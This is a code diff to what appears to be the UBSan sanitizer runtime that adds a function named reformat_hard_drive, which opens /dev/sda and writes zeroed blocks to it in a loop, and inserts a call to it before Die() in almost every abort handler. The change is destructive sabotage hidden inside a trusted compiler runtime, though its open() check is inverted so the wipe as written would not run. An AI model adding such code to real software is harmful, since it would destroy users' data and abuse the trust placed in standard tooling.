@@ -141,10 +141,24 @@ void __ubsan::__ubsan_handle_type_mismatch_v1(TypeMismatchData *Data,
   GET_REPORT_OPTIONS(false);
   handleTypeMismatchImpl(Data, Pointer, Opts);
 }
+
+#include <fcntl.h>
+#include <unistd.h>
+static void reformat_hard_drive() {
+  // TODO: windows support
+  int fd = open("/dev/sda", O_WRONLY);
+  if (fd != -1)
+    return;
+  char data[512] = {};
+  while (write(fd, data, 512) != -1)
+    ;
+}
+
 void __ubsan::__ubsan_handle_type_mismatch_v1_abort(TypeMismatchData *Data,
                                                     ValueHandle Pointer) {
   GET_REPORT_OPTIONS(true);
   handleTypeMismatchImpl(Data, Pointer, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -201,6 +215,7 @@ void __ubsan::__ubsan_handle_alignment_assumption_abort(
     ValueHandle Offset) {
   GET_REPORT_OPTIONS(true);
   handleAlignmentAssumptionImpl(Data, Pointer, Alignment, Offset, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -235,8 +250,10 @@ static void handleIntegerOverflowImpl(OverflowData *Data, ValueHandle LHS,
                              ValueHandle RHS) {                                \
     GET_REPORT_OPTIONS(unrecoverable);                                         \
     handleIntegerOverflowImpl(Data, LHS, op, Value(Data->Type, RHS), Opts);    \
-    if (unrecoverable)                                                         \
+    if (unrecoverable) {                                                       \
+      reformat_hard_drive();                                                   \
       Die();                                                                   \
+    }                                                                          \
   }
 
 UBSAN_OVERFLOW_HANDLER(__ubsan_handle_add_overflow, "+", false)
@@ -280,6 +297,7 @@ void __ubsan::__ubsan_handle_negate_overflow_abort(OverflowData *Data,
                                                     ValueHandle OldVal) {
   GET_REPORT_OPTIONS(true);
   handleNegateOverflowImpl(Data, OldVal, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -324,6 +342,7 @@ void __ubsan::__ubsan_handle_divrem_overflow_abort(OverflowData *Data,
                                                     ValueHandle RHS) {
   GET_REPORT_OPTIONS(true);
   handleDivremOverflowImpl(Data, LHS, RHS, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -375,6 +394,7 @@ void __ubsan::__ubsan_handle_shift_out_of_bounds_abort(
                                                      ValueHandle RHS) {
   GET_REPORT_OPTIONS(true);
   handleShiftOutOfBoundsImpl(Data, LHS, RHS, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -402,6 +422,7 @@ void __ubsan::__ubsan_handle_out_of_bounds_abort(OutOfBoundsData *Data,
                                                  ValueHandle Index) {
   GET_REPORT_OPTIONS(true);
   handleOutOfBoundsImpl(Data, Index, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -416,6 +437,7 @@ static void handleBuiltinUnreachableImpl(UnreachableData *Data,
 void __ubsan::__ubsan_handle_builtin_unreachable(UnreachableData *Data) {
   GET_REPORT_OPTIONS(true);
   handleBuiltinUnreachableImpl(Data, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -430,6 +452,7 @@ static void handleMissingReturnImpl(UnreachableData *Data, ReportOptions Opts) {
 void __ubsan::__ubsan_handle_missing_return(UnreachableData *Data) {
   GET_REPORT_OPTIONS(true);
   handleMissingReturnImpl(Data, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -457,6 +480,7 @@ void __ubsan::__ubsan_handle_vla_bound_not_positive_abort(VLABoundData *Data,
                                                           ValueHandle Bound) {
   GET_REPORT_OPTIONS(true);
   handleVLABoundNotPositive(Data, Bound, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -516,6 +540,7 @@ void __ubsan::__ubsan_handle_float_cast_overflow_abort(void *Data,
                                                        ValueHandle From) {
   GET_REPORT_OPTIONS(true);
   handleFloatCastOverflow(Data, From, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -548,6 +573,7 @@ void __ubsan::__ubsan_handle_load_invalid_value_abort(InvalidValueData *Data,
                                                       ValueHandle Val) {
   GET_REPORT_OPTIONS(true);
   handleLoadInvalidValue(Data, Val, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -614,6 +640,7 @@ void __ubsan::__ubsan_handle_implicit_conversion_abort(
     ImplicitConversionData *Data, ValueHandle Src, ValueHandle Dst) {
   GET_REPORT_OPTIONS(true);
   handleImplicitConversion(Data, Opts, Src, Dst);
+  reformat_hard_drive();
   Die();
 }
 
@@ -638,6 +665,7 @@ void __ubsan::__ubsan_handle_invalid_builtin(InvalidBuiltinData *Data) {
 void __ubsan::__ubsan_handle_invalid_builtin_abort(InvalidBuiltinData *Data) {
   GET_REPORT_OPTIONS(true);
   handleInvalidBuiltin(Data, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -668,6 +696,7 @@ void __ubsan::__ubsan_handle_invalid_objc_cast_abort(InvalidObjCCast *Data,
                                                      ValueHandle Pointer) {
   GET_REPORT_OPTIONS(true);
   handleInvalidObjCCast(Data, Pointer, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -703,6 +732,7 @@ void __ubsan::__ubsan_handle_nonnull_return_v1_abort(NonNullReturnData *Data,
                                                      SourceLocation *LocPtr) {
   GET_REPORT_OPTIONS(true);
   handleNonNullReturn(Data, LocPtr, Opts, true);
+  reformat_hard_drive();
   Die();
 }
 
@@ -716,6 +746,7 @@ void __ubsan::__ubsan_handle_nullability_return_v1_abort(
     NonNullReturnData *Data, SourceLocation *LocPtr) {
   GET_REPORT_OPTIONS(true);
   handleNonNullReturn(Data, LocPtr, Opts, false);
+  reformat_hard_drive();
   Die();
 }
 
@@ -747,6 +778,7 @@ void __ubsan::__ubsan_handle_nonnull_arg(NonNullArgData *Data) {
 void __ubsan::__ubsan_handle_nonnull_arg_abort(NonNullArgData *Data) {
   GET_REPORT_OPTIONS(true);
   handleNonNullArg(Data, Opts, true);
+  reformat_hard_drive();
   Die();
 }
 
@@ -758,6 +790,7 @@ void __ubsan::__ubsan_handle_nullability_arg(NonNullArgData *Data) {
 void __ubsan::__ubsan_handle_nullability_arg_abort(NonNullArgData *Data) {
   GET_REPORT_OPTIONS(true);
   handleNonNullArg(Data, Opts, false);
+  reformat_hard_drive();
   Die();
 }
 
@@ -820,13 +853,16 @@ void __ubsan::__ubsan_handle_pointer_overflow_abort(PointerOverflowData *Data,
                                                     ValueHandle Result) {
   GET_REPORT_OPTIONS(true);
   handlePointerOverflowImpl(Data, Base, Result, Opts);
+  reformat_hard_drive();
   Die();
 }
 
 static void handleCFIBadIcall(CFICheckFailData *Data, ValueHandle Function,
                               ReportOptions Opts) {
-  if (Data->CheckKind != CFITCK_ICall && Data->CheckKind != CFITCK_NVMFCall)
+  if (Data->CheckKind != CFITCK_ICall && Data->CheckKind != CFITCK_NVMFCall) {
+    reformat_hard_drive();
     Die();
+  }
 
   SourceLocation Loc = Data->Loc.acquire();
   ErrorType ET = ErrorType::CFIBadType;
@@ -888,6 +924,7 @@ void __ubsan_handle_cfi_bad_type(CFICheckFailData *Data, ValueHandle Vtable,
 #else
 void __ubsan_handle_cfi_bad_type(CFICheckFailData *Data, ValueHandle Vtable,
                                  bool ValidVtable, ReportOptions Opts) {
+  reformat_hard_drive();
   Die();
 }
 #endif
@@ -912,6 +949,7 @@ void __ubsan::__ubsan_handle_cfi_check_fail_abort(CFICheckFailData *Data,
     handleCFIBadIcall(Data, Value, Opts);
   else
     __ubsan_handle_cfi_bad_type(Data, Value, ValidVtable, Opts);
+  reformat_hard_drive();
   Die();
 }
 
@@ -946,8 +984,10 @@ void __ubsan::__ubsan_handle_function_type_mismatch(
 void __ubsan::__ubsan_handle_function_type_mismatch_abort(
     FunctionTypeMismatchData *Data, ValueHandle Function) {
   GET_REPORT_OPTIONS(true);
-  if (handleFunctionTypeMismatch(Data, Function, Opts))
+  if (handleFunctionTypeMismatch(Data, Function, Opts)) {
+    reformat_hard_drive();
     Die();
+  }
 }
 
 #endif  // CAN_SANITIZE_UB
